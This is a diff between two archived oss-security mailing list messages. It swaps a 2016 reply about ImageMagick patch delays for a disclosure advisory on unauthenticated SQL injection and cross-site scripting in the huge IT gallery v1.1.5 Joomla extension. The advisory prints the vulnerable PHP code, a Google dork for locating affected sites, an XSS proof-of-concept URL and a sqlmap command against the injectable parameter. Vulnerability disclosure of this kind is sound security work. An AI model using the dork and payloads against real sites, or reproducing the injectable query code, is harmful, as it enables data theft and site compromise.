@@ -1,55 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/19/8
-Message-ID: <CANO=Ty26E=diToYAoedQB4JKTbnjykSy94ciE-XBNdyJBU0jNw@mail.gmail.com>
-Date: Thu, 19 May 2016 12:25:09 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: Re: ImageMagick Is On Fire -- CVE-2016-3714
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/01/3
+Message-id: <4C085536-DC31-4B21-B1DE-2DA8F1414995@me.com>
+Date: Thu, 01 Sep 2016 08:22:11 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
 Content-Type: text/plain; charset=utf-8
 
-Without making a commercial pitch for the company I work ... I suspect one
-aspect of other vendors not fixing this is that there is a very
-simple/effective/verifiable workaround to prevent exploitation of this, and
-even with vendor updates I would still suggest using the workaround, after
-reading the MVG docs it seems to much like flash to ever be "safe" (also in
-a web app world I can't imagine a normal use case for people uploading MVG
-files).
-
-On Thu, May 19, 2016 at 11:07 AM, Bob Friesenhahn <
-bfriesen@...ple.dallas.tx.us> wrote:
-
-> I find it very disturbing that there seems to be very little response from
-> popular OS distributions to this issue.  Most do not appear to have issued
-> any package updates to close the shell exploit.  Perhaps
-> the opinion is that major new versions will be introduced as part of major
-> distribution releases and it is ok for users to exposed to problems for two
-> or three years.
->
-> As an example Ubuntu 14.04.4 LTS (which is supposed to be getting security
-> updates) has not provided ImageMagick or GraphicsMagick package updates in
-> 3 years.
->
-> Even NebBSD pkgsrc does not appear to have created a new version to
-> address the "ImageTragick" issues.
->
-> What is the point of security notices and advisories if there is no
-> response from the community to provide updates to protect the majority of
-> their users (who are using 'stable' releases) from the problems?
->
->
-> Bob
-> --
-> Bob Friesenhahn
-> bfriesen@...ple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
-> GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
->
+I thought I should share this here, this vulnerability doesn't require authentication to exploit it has been fixed in v1.1.6 not v1.1.7.
 
 
+Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
+Author: Larry W. Cashdollar, @_larry0 Elitza Neytcheva, @E1337za 
+Date: 2016-07-14
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro
+Vendor: huge-it.com
+Vendor Notified: 2016-07-15, fixed v1.1.6
+Vendor Contact: info@...e-it.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=164
+Description: The plugin allows you to add multiple images to the gallery, create countless galleries, add a description to each of them, as well as make the same things with video links.
+Vulnerability:
+The attacker does not need to be logged in to Joomla to exploit this vulnerability:
 
--- 
+SQL in code via id parameter:
+./administrator/components/com_gallery/models/gallery.php
+51     public function getPropertie() {
+52         $db = JFactory::getDBO();
+53         $id_cat = JRequest::getVar('id');
+54         $query = $db->getQuery(true);
+55         $query->select('#__huge_itgallery_images.name as name,'
+56                 . '#__huge_itgallery_images.id ,'
+57                 . '#__huge_itgallery_gallerys.name as portName,'
+58                 . 'gallery_id, #__huge_itgallery_images.description as description,image_url,sl_url,sl_type,link_target,#__huge_itg    allery_images.ordering,#__huge_itgallery_images.published,published_in_sl_width');
+59         $query->from(array('#__huge_itgallery_gallerys' => '#__huge_itgallery_gallerys', '#__huge_itgallery_images' => '#__huge_itg    allery_images'));
+60         $query->where('#__huge_itgallery_gallerys.id = gallery_id')->where('gallery_id=' . $id_cat);
+61         $query->order('ordering desc');
+62 
+64         $db->setQuery($query);
+65         $results = $db->loadObjectList();
+66         return $results;
+67     }
 
---
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@...hat.com
+XSS is here:
 
+root@...mla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET" {} \;
+./administrator/components/com_gallery/views/gallery/tmpl/default.php
+root@...mla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET" {} \;
+256:                    <a class="modal" rel="{handler: 'iframe', size: {x: 800, y: 500}}" href="index.php?option=com_gallery&view=video&tmpl=component&pid=<?php echo $_GET['id']; ?>" title="Image" >
+
+CVE-2016-1000113 SQLi
+CVE-2016-1000114 XSS
+Google Dork:
+inurl:option=com_gallery inurl:id
+
+Exploit Code:
+XSS PoC
+http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+ 
+SQLi PoC
+http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=SQLiHERE
+
+http://192.168.0.125/index.php?option=com_gallery&id=HERE
+ 
+$ sqlmap -u "http://192.168.0.125/index.php?option=com_gallery&id=*" --dbms mysql
